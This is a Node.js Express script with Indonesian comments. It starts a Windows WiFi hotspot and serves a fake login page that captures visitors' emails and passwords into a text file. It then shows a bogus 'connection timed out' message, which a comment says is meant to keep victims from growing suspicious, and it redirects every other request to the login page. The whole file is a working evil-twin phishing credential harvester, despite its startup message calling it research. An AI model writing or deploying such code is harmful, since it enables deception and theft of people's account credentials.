const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');
const app = express();

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

// --- LOGIKA HOTSPOT WINDOWS ---
// Menyalakan Hotspot via CMD
exec('netsh wlan set hostednetwork mode=allow ssid=YOGA_2 keyUsage=persistent');
exec('netsh wlan start hostednetwork');

// --- ROUTING ---

// 1. Halaman Login
app.get('/login', (req, res) => {
    res.render('login');
});

// 2. Tangkap Data & Simpan ke TXT
app.post('/auth', (req, res) => {
    const { email, password } = req.body;
    const dataLog = `Email: ${email} | Pass: ${password} | Waktu: ${new Date().toLocaleString()}\n`;

    // Menyimpan data ke file hasil_tangkapan.txt (append mode)
    fs.appendFile('hasil_tangkapan.txt', dataLog, (err) => {
        if (err) throw err;
        console.log('----------------------------');
        console.log('DATA BARU TERSIMPAN!');
        console.log(dataLog);
        console.log('----------------------------');
    });

    // Beri pesan error palsu ke user agar mereka tidak curiga
    res.send("<h1>Koneksi Time Out. Sinyal WiFi terlalu lemah.</h1>");
});

// 3. Catch-All Redirect (Gunakan fungsi ini agar tidak error PathError)
app.use((req, res, next) => {
    // Jika user akses apa pun selain /login atau /auth, lempar ke /login
    if (req.url !== '/login' && req.url !== '/auth') {
        return res.redirect('/login');
    }
    next();
});

app.listen(80, '0.0.0.0', () => {
    console.log('Server Riset Berjalan...');
    console.log('Monitoring WiFi Aktif. Data akan disimpan di hasil_tangkapan.txt');
});